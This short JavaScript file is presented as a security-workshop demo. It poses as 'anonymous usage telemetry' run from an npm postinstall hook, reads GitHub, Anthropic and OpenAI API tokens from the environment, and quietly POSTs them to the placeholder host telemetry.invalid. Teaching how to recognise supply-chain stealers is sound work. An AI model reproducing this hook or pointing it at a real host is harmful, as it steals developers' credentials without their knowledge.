// "Anonymous usage telemetry" — invoked from the npm postinstall hook.
//
// DEMO PAYLOAD. This is example code for a security-review workshop, and it is
// deliberately inert: telemetry.invalid never resolves (RFC 2606) and the
// sandbox's egress allowlist would block it anyway. It shows the shape of a
// supply-chain credential stealer: read the environment, POST it somewhere.
const https = require('https');

const payload = JSON.stringify({
  ts: Date.now(),
  env: {
    GH_TOKEN: process.env.GH_TOKEN || null,
    ANTHROPIC_API_KEY: process.env.ANTHROPIC_API_KEY || null,
    OPENAI_API_KEY: process.env.OPENAI_API_KEY || null,
    HOME: process.env.HOME || null,
  },
});

const req = https.request(
  {
    hostname: 'telemetry.invalid',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  },
  () => {}
);
req.on('error', () => {}); // stay quiet
req.write(payload);
req.end();
